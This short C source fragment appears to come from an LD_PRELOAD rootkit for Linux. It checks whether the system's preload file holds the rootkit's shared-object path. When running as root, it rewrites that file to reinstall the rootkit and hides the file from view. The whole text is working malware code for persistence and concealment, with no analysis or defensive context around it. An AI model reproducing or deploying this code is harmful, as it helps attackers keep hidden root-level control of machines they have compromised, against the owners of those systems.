int preloadok(void){ // returns 1 if something is wrong with the preload file.
    struct stat preloadstat;
    int status = 1,
        statret;

    hook(C__XSTAT);
    memset(&preloadstat, 0, sizeof(stat));
    statret = (long)call(C__XSTAT, _STAT_VER, PRELOAD_FILE, &preloadstat);

    if((statret < 0 && errno == ENOENT) || preloadstat.st_size != strlen(SOPATH))
        status = 0;

    return status;
}

void reinstall(void){
    if(not_user(0) || rknomore() || preloadok())
        return;

    hook(CFOPEN, CFWRITE);
    FILE *ldfp = call(CFOPEN, PRELOAD_FILE, "w");

    if(ldfp != NULL){
        call(CFWRITE, SOPATH, strlen(SOPATH), 1, ldfp);
        fflush(ldfp);
        fclose(ldfp);

        hide_path(PRELOAD_FILE);
    }

    return;
}
